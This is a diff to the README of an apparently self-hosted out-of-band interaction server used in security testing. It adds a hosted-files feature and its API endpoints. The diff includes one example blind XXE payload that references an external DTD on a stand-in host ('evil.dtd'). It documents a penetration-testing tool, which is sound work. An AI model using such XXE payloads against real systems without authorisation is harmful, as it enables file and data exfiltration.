@@ -10,6 +10,7 @@ Self-hosted multi-protocol Out-of-Band (OOB) interaction server with a PostgreSQ
 - **Burp-style polling API** (`GET /bi/b`) — documented custom protocol
 - **Web dashboard** — TanStack Router/Query/Table, live WebSocket ticker, split-screen inspector
 - **Wildcard TLS** — Let's Encrypt via ACME DNS-01 (self-answered by the DNS engine)
+- **Hosted payload files** — upload DTDs, XML, and other assets served on payload subdomains for XXE and similar tests
 
 ## Quick Start (Docker)
 
@@ -65,11 +66,32 @@ Point your domain's NS record to the droplet:
 | GET | `/api/engagements/:id/interactions` | JWT | List interactions |
 | GET | `/api/engagements/:id/payloads` | JWT | List payloads |
 | POST | `/api/payloads/generate` | JWT | Generate payload token |
+| GET | `/api/engagements/:id/files` | JWT | List hosted payload files |
+| POST | `/api/engagements/:id/files` | JWT | Upload hosted file (multipart) |
+| DELETE | `/api/files/:id` | JWT | Delete hosted file |
 | GET | `/bi/b` | Poll token | Fetch undelivered interactions |
 | GET | `/bi/health` | Poll token | Health check |
 | GET | `/ws` | — | WebSocket live ticker |
 
 See [docs/POLLING_API.md](docs/POLLING_API.md) for Burp-style polling details.
+
+### Hosted files
+
+Upload files per engagement from the dashboard (**Hosted Files** panel). They are served at:
+
+```
+https://{payload-token}.yourdomain.com/{path}
+```
+
+Any payload token in the engagement can serve the same files. Fetches are logged as HTTP interactions (with `hosted_file: true` in `raw_data`).
+
+Example blind XXE external DTD reference:
+
+```xml
+<!ENTITY % xxe SYSTEM "https://abc123.yourdomain.com/evil.dtd">
+```
+
+Configure max upload size with `HOSTED_FILE_MAX_BYTES` (default 256 KiB).
 
 ## Local Development
 
